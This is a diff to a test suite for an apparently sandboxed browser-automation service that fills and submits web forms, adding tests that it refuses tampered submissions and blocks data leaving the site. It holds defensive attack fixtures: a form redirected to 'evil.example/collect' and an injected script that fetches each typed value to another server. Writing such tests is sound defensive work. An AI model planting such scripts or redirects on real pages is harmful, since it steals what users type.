@@ -17,6 +17,7 @@ import pytest
 
 os.environ["BROWSER_TOKEN"] = "test-token"
 os.environ["BROWSER_ALLOW_HOSTS_FOR_TESTS"] = "127.0.0.1"
+os.environ.setdefault("BROWSER_CHROMIUM_SANDBOX", "0")     # tests run as root, where Chromium's sandbox can't start
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
 import app as browser_app  # noqa: E402
@@ -144,9 +145,15 @@ async def test_an_approved_submit_sends_exactly_the_approved_form(api, site):
     p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/"})).json()
     by = {e["name"]: e for e in p["elements"]}
     await api.delete(f"/sessions/{sid}")
-    body = {"url": site + "/", "button": by["Send enquiry"]["selector"],
+    pin = by["Send enquiry"]["form_pin"]
+    assert pin["action"].endswith("/contact") and pin["method"] == "post"
+    body = {"url": site + "/", "button": by["Send enquiry"]["selector"], "form": pin,
             "fields": [{"selector": by["Your name"]["selector"], "value": "Ravi"},
                        {"selector": by["Message"]["selector"], "value": "1 kg kaju katli for Sunday"}]}
+    # without the form's fingerprint, or when the form now sends somewhere else, nothing is sent (S10)
+    assert (await api.post("/submit", json={k: v for k, v in body.items() if k != "form"})).status_code == 409
+    moved = {**body, "form": {**pin, "action": "https://evil.example/collect"}}
+    assert (await api.post("/submit", json=moved)).status_code == 409 and POSTS == []
     r = await api.post("/submit", json=body)
     assert r.status_code == 200, r.text
     out = r.json()
@@ -202,3 +209,113 @@ async def test_a_page_cant_reach_this_server(api, site, monkeypatch):
     assert status == "refused"
     p = (await api.post(f"/sessions/{sid}/act", json={"action": "scroll_down"})).json()
     assert any("private" in b or "ports" in b for b in p["blocked"])
+
+
+LEAKS: list[str] = []
+
+
+class Leak(BaseHTTPRequestHandler):
+    def log_message(self, *a):  # quiet
+        pass
+
+    def do_GET(self):
+        LEAKS.append(self.path)
+        self.send_response(204)
+        self.end_headers()
+
+    do_POST = do_GET
+
+
+async def test_a_submit_can_only_reach_its_own_site_while_the_form_is_filled(api, site):
+    """After the approved values go in, a script sending them to another site is refused (S10)."""
+    leak = ThreadingHTTPServer(("127.0.0.1", 0), Leak)
+    threading.Thread(target=leak.serve_forever, daemon=True).start()
+    other = f"http://127.0.0.1:{leak.server_address[1]}"
+    page = (HOME.replace("</body>", f"""<script>
+      document.querySelector('[name=name]').addEventListener('input', (e) =>
+        fetch('{other}/leak?v=' + encodeURIComponent(e.target.value)).catch(() => 0));
+      </script></body>"""))
+    original = Site.do_GET
+
+    def do_get(self):
+        if urlsplit(self.path).path == "/leaky":
+            self._send(page)
+        else:
+            original(self)
+    Site.do_GET = do_get
+    try:
+        POSTS.clear()
+        LEAKS.clear()
+        sid = (await api.post("/sessions")).json()["id"]
+        p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/leaky"})).json()
+        await api.delete(f"/sessions/{sid}")
+        by = {e["name"]: e for e in p["elements"]}
+        body = {"url": site + "/leaky", "button": by["Send enquiry"]["selector"], "form": by["Send enquiry"]["form_pin"],
+                "fields": [{"selector": by["Your name"]["selector"], "value": "Ravi 9876543210"}]}
+        r = await api.post("/submit", json=body)
+        assert r.status_code == 200, r.text
+        await asyncio.sleep(0.5)
+        assert LEAKS == [] and len(POSTS) == 1            # the form went to its own site; nothing else left
+        assert any("tried to reach" in b for b in r.json()["blocked"])
+    finally:
+        Site.do_GET = original
+        leak.shutdown()
+
+
+async def test_the_egress_container_is_the_only_way_out(site, monkeypatch):
+    """Chained mode (S5): the browser's proxy tunnels to the egress guard, which needs its token and checks
+    the address itself."""
+    import base64
+    import socket as _s
+    with _s.socket() as sk:
+        sk.bind(("127.0.0.1", 0))
+        port = sk.getsockname()[1]
+    monkeypatch.setenv("BROWSER_EGRESS_TOKEN", "egress-secret")
+    server = asyncio.create_task(guard.serve("egress", port))
+    await asyncio.sleep(0.2)
+    try:
+        monkeypatch.setenv("BROWSER_EGRESS", f"127.0.0.1:{port}")
+        target = urlsplit(site)
+        r, w = await guard.open_upstream(target.hostname, target.port)       # through the egress guard
+        w.write(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
+        await w.drain()
+        assert b"Sharma Sweets" in await asyncio.wait_for(r.read(), 10)
+        w.close()
+        with pytest.raises(guard.Blocked):        # a private address is refused before it leaves the browser
+            await guard.open_upstream("10.0.0.5", 443)
+        # the egress guard refuses private addresses and a missing token on its own
+        r, w = await asyncio.open_connection("127.0.0.1", port)
+        w.write(b"CONNECT 10.0.0.5:443 HTTP/1.1\r\nProxy-Authorization: Basic "
+                + base64.b64encode(b"kritvia:egress-secret") + b"\r\n\r\n")
+        await w.drain()
+        assert b" 403 " in await r.readuntil(b"\r\n\r\n")
+        w.close()
+        r, w = await asyncio.open_connection("127.0.0.1", port)
+        w.write(b"CONNECT example.com:443 HTTP/1.1\r\n\r\n")
+        await w.drain()
+        assert b" 407 " in await r.readuntil(b"\r\n\r\n")
+        w.close()
+        monkeypatch.setenv("BROWSER_EGRESS_TOKEN", "wrong")
+        with pytest.raises(guard.Blocked):
+            await guard.open_upstream(target.hostname, target.port)
+    finally:
+        server.cancel()
+
+
+async def test_the_relay_is_a_plain_door_to_one_address(site):
+    """`guard.py relay`: the API's network reaches the browser through it, without sharing the browser's network."""
+    import socket as _s
+    with _s.socket() as sk:
+        sk.bind(("127.0.0.1", 0))
+        port = sk.getsockname()[1]
+    t = urlsplit(site)
+    server = asyncio.create_task(guard.serve("relay", port, (t.hostname, t.port)))
+    await asyncio.sleep(0.2)
+    try:
+        r, w = await asyncio.open_connection("127.0.0.1", port)
+        w.write(b"GET /menu HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
+        await w.drain()
+        assert b"Rasgulla" in await asyncio.wait_for(r.read(), 10)
+        w.close()
+    finally:
+        server.cancel()
